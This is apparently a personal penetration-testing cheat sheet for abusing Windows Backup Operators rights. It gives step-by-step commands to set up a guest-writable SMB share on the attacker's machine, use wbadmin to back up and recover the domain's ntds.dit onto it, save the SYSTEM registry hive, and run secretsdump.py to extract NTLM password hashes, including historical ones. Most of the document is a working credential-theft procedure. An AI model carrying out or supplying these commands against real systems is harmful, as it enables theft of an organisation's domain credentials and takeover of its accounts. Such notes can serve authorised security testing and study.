# Backup Operator

## Pre-requisites
1. The user should be in backup operator group (whoami /groups)
2. SeBackupPrivilege or SeRestorePrivilege  be enabled!
3. Local Admin account is enabled!
4. Local Admin can remotely connect with account admin privileges

## Methodology

### Using Wbadmin Utility
Before doing this we first need to create an ntds drive so that we can download it. It wont work other wise

#### Creating NTDS Drive!
IF YOU ARE USING YOUR ACER its already there just use that!
1.  FIRST TAKE A SNAPSHOT OF THE FKIN VM CUZ U MIGHT MESS SOMETHING UP
2.  sudo su 
3. dd if=/dev/zero of=ntfs.disk bs=1024M count=2
4. losetup -fP ntfs.disk
5. losetup -a ---> /dev/loop0
6. mkfs.ntfs /dev/loop0
7. mount /dev/loop0 path_to_whichever_directory_you_want_to_download (make a new directory with 777 as perm and then do)
8. Done
#### Configure SMB
1. go to /etc/samba/smb.conf
2. copy the \[print\$\] wala puura and paste below
3. Delete this asapp when your work is done! ----> add this to the checklist
4. Change the print --> whatever you want your share name to be
5. change the path to desired directory
6. set guest ok = yes
#### Exploit 
1. Go to the victim machine!
2. net use x: \\IP\Share_name
3. echo y | wbadmin start backup -backuptarget:\\IP\Dasher -include:c:\windows\ntds
4. wbadmin get versions 
5. get your version and keep it 
6. echo Y | wbadmin start recovery -version:version -itemtype:file -items:C:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
7. go to C:\ do dir
8. ntds.dit should be there --> get it local machine
9. do reg save HKLM\SYTEM system.hive --->get this too
10. DO secretsdump.py -ntds\<put\>  -system \<put\> LOCAL (add -history for passwords used in past)
11. DONE! We will get NTLM HASH!
 
